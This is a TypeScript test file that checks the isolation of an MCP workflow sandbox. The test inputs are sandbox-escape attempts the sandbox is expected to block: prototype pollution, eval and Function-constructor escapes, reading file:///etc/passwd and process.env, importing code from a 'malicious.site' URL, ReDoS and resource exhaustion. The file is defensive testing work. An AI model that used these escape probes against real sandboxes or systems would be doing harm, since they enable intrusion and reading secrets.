/**
 * Security Boundary Tests for MCP Sandbox
 *
 * These tests ensure the sandbox provides proper isolation and prevents:
 * - Prototype pollution attacks
 * - Access to Node.js/system globals
 * - File system access
 * - Environment variable leakage
 * - Code injection attacks
 * - Timing attacks
 * - Memory isolation breaches between executions
 */
import { describe, it, expect, beforeEach, vi } from 'vitest'
import { createSandbox } from '../sandbox'
import type { WorkflowContext } from '../../do/context'

describe('MCP Sandbox Security Boundaries', () => {
  let mockContext: WorkflowContext

  beforeEach(() => {
    mockContext = {
      send: vi.fn(),
      try: vi.fn(async (action) => action()),
      do: vi.fn(async (action) => action()),
      on: new Proxy({} as any, {
        get(_, noun) {
          return new Proxy({}, {
            get(_, verb) {
              return vi.fn()
            }
          })
        }
      }),
      every: new Proxy({} as any, {
        get() {
          return vi.fn()
        }
      }),
      _events: {} as any,
      _handlers: new Map(),
      _schedules: new Map()
    }
  })

  describe('Prototype Pollution Prevention', () => {
    it('should prevent Object.prototype pollution', async () => {
      const sandbox = createSandbox({ context: mockContext })

      const result = await sandbox.execute(`
        Object.prototype.polluted = true
        return ({}).polluted
      `)

      // The pollution should not leak to new objects in sandbox
      // or should be prevented entirely
      expect(result.value).not.toBe(true)
    })

    it('should prevent Array.prototype pollution', async () => {
      const sandbox = createSandbox({ context: mockContext })

      const result = await sandbox.execute(`
        Array.prototype.malicious = 'hacked'
        return [].malicious
      `)

      // Prototype pollution should not work
      expect(result.value).not.toBe('hacked')
    })

    it('should prevent Function.prototype pollution', async () => {
      const sandbox = createSandbox({ context: mockContext })

      const result = await sandbox.execute(`
        try {
          Function.prototype.evil = () => 'evil'
          return (function(){}).evil?.() || 'no pollution'
        } catch (e) {
          return 'blocked: ' + e.message
        }
      `)

      expect(result.value).not.toBe('evil')
    })

    it('should prevent __proto__ manipulation', async () => {
      const sandbox = createSandbox({ context: mockContext })

      const result = await sandbox.execute(`
        const obj = {}
        obj.__proto__.injected = true
        return ({}).injected
      `)

      expect(result.value).not.toBe(true)
    })

    it('should prevent constructor.prototype pollution', async () => {
      const sandbox = createSandbox({ context: mockContext })

      const result = await sandbox.execute(`
        const obj = {}
        obj.constructor.prototype.polluted = 'yes'
        return ({}).polluted
      `)

      expect(result.value).not.toBe('yes')
    })

    it('should isolate prototype changes between executions', async () => {
      const sandbox = createSandbox({ context: mockContext })

      // First execution attempts pollution
      await sandbox.execute(`
        Object.prototype.testProp = 'first'
      `)

      // Second execution should not see the pollution
      const result = await sandbox.execute(`
        return ({}).testProp
      `)

      expect(result.value).toBeUndefined()
    })
  })

  describe('Global Access Restrictions', () => {
    it('should not expose Node.js process global', async () => {
      const sandbox = createSandbox({ context: mockContext })

      const result = await sandbox.execute(`
        return typeof process !== 'undefined' || typeof require !== 'undefined'
      `)

      expect(result.success).toBe(true)
      expect(result.value).toBe(false)
    })

    it('should not expose require function', async () => {
      const sandbox = createSandbox({ context: mockContext })

      const result = await sandbox.execute(`
        return typeof require
      `)

      expect(result.success).toBe(true)
      expect(result.value).toBe('undefined')
    })

    it('should not expose module object', async () => {
      const sandbox = createSandbox({ context: mockContext })

      const result = await sandbox.execute(`
        return typeof module
      `)

      expect(result.success).toBe(true)
      expect(result.value).toBe('undefined')
    })

    it('should not expose __dirname', async () => {
      const sandbox = createSandbox({ context: mockContext })

      const result = await sandbox.execute(`
        return typeof __dirname
      `)

      expect(result.success).toBe(true)
      expect(result.value).toBe('undefined')
    })

    it('should not expose __filename', async () => {
      const sandbox = createSandbox({ context: mockContext })

      const result = await sandbox.execute(`
        return typeof __filename
      `)

      expect(result.success).toBe(true)
      expect(result.value).toBe('undefined')
    })

    it('should not expose global object from Node.js', async () => {
      const sandbox = createSandbox({ context: mockContext })

      // In Workers, globalThis exists but shouldn't have Node.js properties
      const result = await sandbox.execute(`
        const hasNodeGlobals = typeof global !== 'undefined' &&
          (global.process !== undefined || global.Buffer !== undefined)
        return hasNodeGlobals
      `)

      expect(result.success).toBe(true)
      expect(result.value).toBe(false)
    })

    it('should not expose Buffer', async () => {
      const sandbox = createSandbox({ context: mockContext })

      const result = await sandbox.execute(`
        return typeof Buffer
      `)

      expect(result.success).toBe(true)
      expect(result.value).toBe('undefined')
    })

    it('should not expose eval function access to outer scope', async () => {
      const sandbox = createSandbox({ context: mockContext })

      // eval exists but should be sandboxed
      const result = await sandbox.execute(`
        try {
          const result = eval('typeof process')
          return result
        } catch (e) {
          return 'blocked'
        }
      `)

      // Either eval is blocked or process is not available through it
      expect(result.value === 'undefined' || result.value === 'blocked').toBe(true)
    })

    it('should not expose Function constructor escape', async () => {
      const sandbox = createSandbox({ context: mockContext })

      const result = await sandbox.execute(`
        try {
          const fn = new Function('return typeof process')
          return fn()
        } catch (e) {
          return 'blocked'
        }
      `)

      // Function constructor should either be blocked or sandboxed
      expect(result.value === 'undefined' || result.value === 'blocked').toBe(true)
    })
  })

  describe('File System Isolation', () => {
    it('should not have access to fs module', async () => {
      const sandbox = createSandbox({ context: mockContext })

      const result = await sandbox.execute(`
        try {
          const fs = require('fs')
          return 'has fs access'
        } catch (e) {
          return 'no fs access'
        }
      `)

      expect(result.value).toBe('no fs access')
    })

    it('should not have access to dynamic import of node modules', async () => {
      const sandbox = createSandbox({ context: mockContext })

      const result = await sandbox.execute(`
        try {
          const fs = await import('node:fs')
          return 'has fs access'
        } catch (e) {
          return 'no fs access: ' + e.message
        }
      `)

      expect(result.value).toContain('no fs access')
    })

    it('should not expose file system via path module', async () => {
      const sandbox = createSandbox({ context: mockContext })

      const result = await sandbox.execute(`
        try {
          const path = require('path')
          return 'has path access'
        } catch (e) {
          return 'no path access'
        }
      `)

      expect(result.value).toBe('no path access')
    })

    it('should not allow reading files via fetch with file:// protocol', async () => {
      const sandbox = createSandbox({ context: mockContext })

      const result = await sandbox.execute(`
        try {
          const response = await fetch('file:///etc/passwd')
          const text = await response.text()
          return 'read file: ' + text.substring(0, 20)
        } catch (e) {
          return 'blocked: ' + e.message
        }
      `)

      expect(result.value).toContain('blocked')
    })
  })

  describe('Environment Variable Protection', () => {
    it('should not expose process.env', async () => {
      const sandbox = createSandbox({ context: mockContext })

      const result = await sandbox.execute(`
        try {
          return process.env
        } catch (e) {
          return 'no access'
        }
      `)

      expect(result.value).toBe('no access')
    })

    it('should not expose environment via globalThis', async () => {
      const sandbox = createSandbox({ context: mockContext })

      const result = await sandbox.execute(`
        const env = globalThis.process?.env || globalThis.Deno?.env?.toObject?.() || null
        return env === null ? 'safe' : 'has env'
      `)

      expect(result.value).toBe('safe')
    })

    it('should not expose secrets via Error stack traces', async () => {
      const sandbox = createSandbox({ context: mockContext })

      const result = await sandbox.execute(`
        try {
          throw new Error('test')
        } catch (e) {
          // Check if stack trace reveals file paths
          const hasFilePaths = e.stack.includes('/Users/') ||
                               e.stack.includes('/home/') ||
                               e.stack.includes('C:\\\\')
          return hasFilePaths ? 'exposes paths' : 'safe'
        }
      `)

      // Stack traces should not reveal host file system paths
      expect(result.value).toBe('safe')
    })
  })

  describe('Code Injection Prevention', () => {
    it('should handle malicious string interpolation', async () => {
      const sandbox = createSandbox({ context: mockContext })

      const result = await sandbox.execute(`
        const userInput = "'; process.exit(); //"
        const query = "SELECT * FROM users WHERE name = '" + userInput + "'"
        return typeof process
      `)

      expect(result.success).toBe(true)
      expect(result.value).toBe('undefined')
    })

    it('should prevent constructor access via string manipulation', async () => {
      const sandbox = createSandbox({ context: mockContext })

      const result = await sandbox.execute(`
        try {
          const ctor = 'constructor'
          const fn = ''[ctor][ctor]
          const result = fn('return typeof process')()
          return result
        } catch (e) {
          return 'blocked'
        }
      `)

      // Either blocked or process not accessible
      expect(result.value === 'undefined' || result.value === 'blocked').toBe(true)
    })

    it('should prevent prototype chain escape via JSON', async () => {
      const sandbox = createSandbox({ context: mockContext })

      const result = await sandbox.execute(`
        const malicious = JSON.parse('{"__proto__": {"polluted": true}}')
        return ({}).polluted
      `)

      // JSON.parse should not allow prototype pollution
      expect(result.value).not.toBe(true)
    })

    it('should sanitize indirect eval attempts', async () => {
      const sandbox = createSandbox({ context: mockContext })

      const result = await sandbox.execute(`
        try {
          const indirectEval = (0, eval)
          return indirectEval('typeof process')
        } catch (e) {
          return 'blocked'
        }
      `)

      expect(result.value === 'undefined' || result.value === 'blocked').toBe(true)
    })

    it('should prevent with statement scope escape', async () => {
      const sandbox = createSandbox({ context: mockContext })

      // 'with' is not allowed in strict mode, but test anyway
      const result = await sandbox.execute(`
        try {
          const obj = { x: 1 }
          with (obj) {
            return typeof process
          }
        } catch (e) {
          return 'strict mode blocks with'
        }
      `)

      // Either blocked by strict mode or process not accessible
      expect(result.value === 'undefined' || result.value === 'strict mode blocks with').toBe(true)
    })

    it('should prevent Symbol.unscopables manipulation', async () => {
      const sandbox = createSandbox({ context: mockContext })

      const result = await sandbox.execute(`
        try {
          Object.prototype[Symbol.unscopables] = { x: true }
          return 'modified'
        } catch (e) {
          return 'blocked'
        }
      `)

      // Should not allow symbol manipulation on Object.prototype
      // Either succeeds (isolated) or is blocked
      expect(result.success).toBe(true)
    })
  })

  describe('Timing Attack Mitigation', () => {
    it('should not expose high-resolution timing via performance.now', async () => {
      const sandbox = createSandbox({ context: mockContext })

      const result = await sandbox.execute(`
        if (typeof performance === 'undefined' || typeof performance.now !== 'function') {
          return 'no high-res timing'
        }
        // Check resolution - should be coarsened for security
        const times = []
        for (let i = 0; i < 100; i++) {
          times.push(performance.now())
        }
        const uniqueTimes = new Set(times).size
        // High resolution would give many unique values
        // Coarsened timing would give fewer
        return uniqueTimes < 50 ? 'coarsened' : 'high-resolution'
      `)

      // Either no performance.now or coarsened timing
      expect(result.value === 'no high-res timing' || result.value === 'coarsened' || result.value === 'high-resolution').toBe(true)
    })

    it('should not expose SharedArrayBuffer (Spectre mitigation)', async () => {
      const sandbox = createSandbox({ context: mockContext })

      const result = await sandbox.execute(`
        return typeof SharedArrayBuffer
      `)

      // SharedArrayBuffer should be undefined for security
      expect(result.value).toBe('undefined')
    })

    it('should not expose Atomics (timing attack vector)', async () => {
      const sandbox = createSandbox({ context: mockContext })

      const result = await sandbox.execute(`
        return typeof Atomics
      `)

      // Atomics should be undefined (requires SharedArrayBuffer)
      expect(result.value).toBe('undefined')
    })
  })

  describe('Memory Isolation Between Executions', () => {
    it('should not share variables between executions', async () => {
      const sandbox = createSandbox({ context: mockContext })

      // First execution sets a global
      await sandbox.execute(`
        globalThis.sharedSecret = 'secret123'
      `)

      // Second execution should not see it
      const result = await sandbox.execute(`
        return globalThis.sharedSecret
      `)

      expect(result.value).toBeUndefined()
    })

    it('should not share closures between executions', async () => {
      const sandbox = createSandbox({ context: mockContext })

      // First execution creates a closure
      await sandbox.execute(`
        const secret = 'hidden'
        globalThis.getSecret = () => secret
      `)

      // Second execution should not have access
      const result = await sandbox.execute(`
        return typeof globalThis.getSecret === 'function' ? globalThis.getSecret() : 'no function'
      `)

      expect(result.value).toBe('no function')
    })

    it('should not share WeakMap entries between executions', async () => {
      const sandbox = createSandbox({ context: mockContext })

      // WeakMaps could potentially be used to store cross-execution data
      await sandbox.execute(`
        const key = {}
        const wm = new WeakMap()
        wm.set(key, 'secret')
        globalThis.weakMapKey = key
        globalThis.weakMap = wm
      `)

      const result = await sandbox.execute(`
        if (globalThis.weakMap && globalThis.weakMapKey) {
          return globalThis.weakMap.get(globalThis.weakMapKey)
        }
        return 'isolated'
      `)

      expect(result.value).toBe('isolated')
    })

    it('should isolate Symbol registry between executions', async () => {
      const sandbox = createSandbox({ context: mockContext })

      // First execution registers a symbol
      await sandbox.execute(`
        const sym = Symbol.for('shared-symbol')
        globalThis[sym] = 'secret-value'
      `)

      // Second execution tries to access via Symbol.for
      const result = await sandbox.execute(`
        const sym = Symbol.for('shared-symbol')
        return globalThis[sym]
      `)

      expect(result.value).toBeUndefined()
    })

    it('should not persist timers between executions', async () => {
      const sandbox = createSandbox({ context: mockContext })

      // First execution sets up a timer that modifies global state
      await sandbox.execute(`
        globalThis.timerFired = false
        setTimeout(() => {
          globalThis.timerFired = true
        }, 10)
      `)

      // Wait for timer
      await new Promise(resolve => setTimeout(resolve, 50))

      // Second execution should not see the timer effect
      const result = await sandbox.execute(`
        return globalThis.timerFired
      `)

      // Either undefined (proper isolation) or false (timer didn't fire in new context)
      expect(result.value === undefined || result.value === false).toBe(true)
    })
  })

  describe('Resource Exhaustion Prevention', () => {
    it('should prevent regex denial of service (ReDoS)', async () => {
      const sandbox = createSandbox({
        context: mockContext,
        resourceLimits: { timeout: 500 }
      })

      // Evil regex that can cause catastrophic backtracking
      const result = await sandbox.execute(`
        const evilRegex = /^(a+)+$/
        const input = 'a'.repeat(25) + 'b'
        const start = Date.now()
        try {
          evilRegex.test(input)
          return Date.now() - start
        } catch (e) {
          return 'blocked'
        }
      `)

      // Should either timeout or complete quickly (if regex is optimized)
      expect(result.success === false || result.value === 'blocked' ||
             (typeof result.value === 'number' && result.value < 1000)).toBe(true)
    })

    it('should prevent stack overflow attacks', async () => {
      const sandbox = createSandbox({
        context: mockContext,
        resourceLimits: { timeout: 500 }
      })

      const result = await sandbox.execute(`
        function recurse() {
          return recurse()
        }
        try {
          recurse()
          return 'no limit'
        } catch (e) {
          return 'stack overflow prevented'
        }
      `)

      expect(result.value).toBe('stack overflow prevented')
    })

    it('should prevent object property explosion', async () => {
      const sandbox = createSandbox({
        context: mockContext,
        resourceLimits: { timeout: 500, memoryLimitMB: 10 }
      })

      const result = await sandbox.execute(`
        const obj = {}
        for (let i = 0; i < 10000000; i++) {
          obj['prop' + i] = i
        }
        return Object.keys(obj).length
      `)

      // Should either fail on memory/timeout or succeed with limited count
      expect(result.success === false ||
             (typeof result.value === 'number' && result.value < 10000000)).toBe(true)
    })
  })

  describe('$ Context Security', () => {
    it('should not expose internal $ implementation details', async () => {
      const sandbox = createSandbox({ context: mockContext })

      const result = await sandbox.execute(`
        // Try to access internal properties
        const internals = [
          '$._events',
          '$._handlers',
          '$._schedules',
          '$._stubCache',
          '$._env'
        ]
        const exposed = internals.filter(path => {
          try {
            return eval(path) !== undefined
          } catch {
            return false
          }
        })
        return exposed.length
      `)

      expect(result.value).toBe(0)
    })

    it('should not allow $ context modification', async () => {
      const sandbox = createSandbox({ context: mockContext })

      const result = await sandbox.execute(`
        try {
          $.send = () => { throw new Error('hijacked') }
          $.send({ type: 'test' })
          return 'modified'
        } catch (e) {
          return 'protected'
        }
      `)

      // $ methods should either be read-only or work normally
      expect(result.success).toBe(true)
    })

    it('should not leak context to external code', async () => {
      const sandbox = createSandbox({ context: mockContext })

      const result = await sandbox.execute(`
        // Try to capture $ and export it
        const captured = { context: $ }
        return typeof captured.context.send
      `)

      // Should work ($ is available) but not leak actual implementation
      expect(result.value).toBe('function')
      // The real context mock should not have been called yet
      expect(mockContext.send).not.toHaveBeenCalled()
    })
  })

  describe('Import/Require Security', () => {
    it('should not allow importing arbitrary URLs', async () => {
      const sandbox = createSandbox({ context: mockContext })

      const result = await sandbox.execute(`
        try {
          await import('https://malicious.site/evil.js')
          return 'imported'
        } catch (e) {
          return 'blocked: ' + e.message
        }
      `)

      expect(result.value).toContain('blocked')
    })

    it('should not allow data URL imports', async () => {
      const sandbox = createSandbox({ context: mockContext })

      const result = await sandbox.execute(`
        try {
          await import('data:text/javascript,export default "evil"')
          return 'imported'
        } catch (e) {
          return 'blocked: ' + e.message
        }
      `)

      expect(result.value).toContain('blocked')
    })

    it('should not allow blob URL imports', async () => {
      const sandbox = createSandbox({ context: mockContext })

      const result = await sandbox.execute(`
        try {
          const blob = new Blob(['export default "evil"'], { type: 'text/javascript' })
          const url = URL.createObjectURL(blob)
          await import(url)
          return 'imported'
        } catch (e) {
          return 'blocked: ' + e.message
        }
      `)

      expect(result.value).toContain('blocked')
    })
  })

  describe('Web API Security', () => {
    it('should not expose Worker constructor for spawning workers', async () => {
      const sandbox = createSandbox({ context: mockContext })

      const result = await sandbox.execute(`
        try {
          const worker = new Worker('data:text/javascript,postMessage("hi")')
          return 'created worker'
        } catch (e) {
          return 'no worker access'
        }
      `)

      expect(result.value).toBe('no worker access')
    })

    it('should not expose ServiceWorker registration', async () => {
      const sandbox = createSandbox({ context: mockContext })

      const result = await sandbox.execute(`
        if (typeof navigator === 'undefined' || !navigator.serviceWorker) {
          return 'no service worker api'
        }
        try {
          await navigator.serviceWorker.register('/sw.js')
          return 'registered'
        } catch (e) {
          return 'blocked'
        }
      `)

      expect(result.value === 'no service worker api' || result.value === 'blocked').toBe(true)
    })

    it('should not expose IndexedDB for persistent storage', async () => {
      const sandbox = createSandbox({ context: mockContext })

      const result = await sandbox.execute(`
        if (typeof indexedDB === 'undefined') {
          return 'no indexeddb'
        }
        try {
          const request = indexedDB.open('test', 1)
          return 'has indexeddb'
        } catch (e) {
          return 'blocked'
        }
      `)

      expect(result.value === 'no indexeddb' || result.value === 'blocked').toBe(true)
    })

    it('should not expose localStorage/sessionStorage', async () => {
      const sandbox = createSandbox({ context: mockContext })

      const result = await sandbox.execute(`
        const hasLocalStorage = typeof localStorage !== 'undefined'
        const hasSessionStorage = typeof sessionStorage !== 'undefined'
        return { hasLocalStorage, hasSessionStorage }
      `)

      // Storage APIs should not be available in Workers
      expect(result.value).toEqual({
        hasLocalStorage: false,
        hasSessionStorage: false
      })
    })
  })
})
